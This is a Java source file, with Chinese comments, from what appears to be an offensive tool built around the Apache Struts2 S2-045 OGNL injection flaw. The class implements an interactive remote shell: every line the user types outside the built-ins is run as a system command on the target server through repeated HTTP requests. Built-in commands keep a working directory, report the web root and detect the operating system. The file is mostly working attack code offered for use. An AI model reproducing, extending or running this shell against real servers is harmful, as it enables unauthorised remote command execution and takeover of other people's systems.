package com.s2tool.modules;

import com.s2tool.core.HttpClient;
import com.s2tool.core.Target;
import com.s2tool.utils.Logger;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

/**
 * 交互式 Shell：通过自动化串行发送 HTTP 请求实现命令交互。
 *
 * <p>原理：S2-045 的利用方式是每次请求独立执行 OGNL 表达式，因此交互式
 * Shell 本质上是"自动发送请求"。工作目录通过记录当前路径并在每条命令前
 * 显式 cd 实现持久化。</p>
 *
 * <p>支持内建命令：
 * <ul>
 *   <li>cd &lt;path&gt; - 切换工作目录（持久化）</li>
 *   <li>pwd - 显示当前工作目录</li>
 *   <li>webroot - 获取 Web 根目录</li>
 *   <li>os - 显示操作系统类型</li>
 *   <li>help - 帮助</li>
 *   <li>exit / quit - 退出 Shell</li>
 * </ul></p>
 */
public class Shell {

    private final HttpClient http;
    private final Target target;
    private final Executor executor;
    private final InfoGather info;

    private String cwd = "~";
    private boolean initialized = false;

    /** 命令历史（简易实现） */
    private final List<String> history = new ArrayList<>();

    public Shell(HttpClient http, Target target) {
        this.http = http;
        this.target = target;
        this.executor = new Executor(http, target);
        this.info = new InfoGather(http, target);
    }

    /**
     * 启动交互式 Shell（阻塞直到退出）。
     */
    public void start() {
        Logger.success("已连接 " + target.getFullUrl());
        printBanner();
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
            while (true) {
                String prompt = "S2-045@" + target.getHost() + ":" + target.getPort()
                        + (cwd != null ? cwd : "~") + "> ";
                System.out.print(prompt);
                System.out.flush();
                String line = reader.readLine();
                if (line == null) {
                    Logger.info("输入流关闭，退出 Shell");
                    break;
                }
                String cmd = line.trim();
                if (cmd.isEmpty()) continue;
                history.add(cmd);
                if (handleBuiltin(cmd)) {
                    if (cmd.equalsIgnoreCase("exit") || cmd.equalsIgnoreCase("quit")) {
                        break;
                    }
                    continue;
                }
                executeRemote(cmd);
            }
        } catch (IOException e) {
            Logger.error("Shell 输入异常: " + e.getMessage());
        }
    }

    /** 远程执行命令并显示结果 */
    private void executeRemote(String cmd) {
        String fullCmd = buildCommandWithCwd(cmd);
        Logger.debug("执行: " + fullCmd);
        Executor.ExecResult r = executor.exec(fullCmd, 60000);
        if (r.isSuccess()) {
            String out = r.getOutput();
            if (out == null || out.trim().isEmpty()) {
                Logger.info("(无输出)");
            } else {
                // 直接输出（不经过 Logger 以避免前缀干扰命令输出解析）
                System.out.println(out.endsWith("\n") ? out : out + "\n");
            }
        } else {
            Logger.fail(r.getOutput());
        }
    }

    /** 构造带工作目录前缀的完整命令 */
    private String buildCommandWithCwd(String cmd) {
        if (cwd == null || "~".equals(cwd) || "/".equals(cwd)) {
            return cmd;
        }
        return "cd " + cwd + " && " + cmd;
    }

    /**
     * 处理内建命令。
     *
     * @return true 表示已处理（无需远程执行）
     */
    private boolean handleBuiltin(String cmd) {
        String lower = cmd.toLowerCase();
        if (lower.equals("exit") || lower.equals("quit")) {
            Logger.info("再见。");
            return true;
        }
        if (lower.equals("help")) {
            printHelp();
            return true;
        }
        if (lower.startsWith("cd ")) {
            String dir = cmd.substring(3).trim();
            // 验证目录存在并切换
            String os = detectOsOnce();
            Executor.ExecResult r = executor.exec(buildCommandWithCwd("cd " + dir + " && pwd"), 20000);
            if (r.isSuccess() && r.getOutput() != null && !r.getOutput().contains("No such file")) {
                String newCwd = r.getOutput().trim().split("\n")[0].trim();
                if (!newCwd.isEmpty() && !newCwd.contains("cannot") && !newCwd.contains("No such")) {
                    cwd = newCwd;
                    Logger.success("当前目录: " + cwd);
                    return true;
                }
            }
            Logger.fail("目录切换失败: " + dir);
            return true;
        }
        if (lower.equals("pwd")) {
            if (cwd != null && !"~".equals(cwd)) {
                System.out.println(cwd);
            } else {
                Executor.ExecResult r = executor.exec("pwd", 15000);
                System.out.println(r.getOutput());
            }
            return true;
        }
        if (lower.equals("webroot") || lower.equals("webpath")) {
            String root = info.getWebRoot();
            if (root != null) {
                Logger.success("Web 根目录: " + root);
            } else {
                Logger.fail("获取 Web 根目录失败");
            }
            return true;
        }
        if (lower.equals("os")) {
            Logger.success("操作系统: " + info.detectOs());
            return true;
        }
        if (lower.equals("clear") || lower.equals("cls")) {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            return true;
        }
        return false;
    }

    private String detectOsOnce() {
        if (!initialized) {
            // 初始化时获取一次 cwd
            Executor.ExecResult r = executor.exec("pwd", 15000);
            if (r.isSuccess() && r.getOutput() != null) {
                String out = r.getOutput().trim();
                if (!out.isEmpty() && !out.contains("command not found")) {
                    cwd = out.split("\n")[0].trim();
                }
            }
            initialized = true;
        }
        return "";
    }

    private void printBanner() {
        Logger.raw("┌─────────────────────────────────────────────┐");
        Logger.raw("│  S2-045 交互式 Shell                        │");
        Logger.raw("│  输入 exit/quit 退出，help 查看帮助          │");
        Logger.raw("└─────────────────────────────────────────────┘");
    }

    private void printHelp() {
        Logger.raw("");
        Logger.raw("内建命令:");
        Logger.raw("  cd <path>   - 切换工作目录（持久化）");
        Logger.raw("  pwd         - 显示当前工作目录");
        Logger.raw("  webroot     - 获取 Web 根目录");
        Logger.raw("  os          - 显示操作系统类型");
        Logger.raw("  help        - 显示帮助");
        Logger.raw("  exit/quit   - 退出 Shell");
        Logger.raw("  其他输入     - 作为系统命令远程执行");
        Logger.raw("");
    }

    public List<String> getHistory() {
        return history;
    }
}
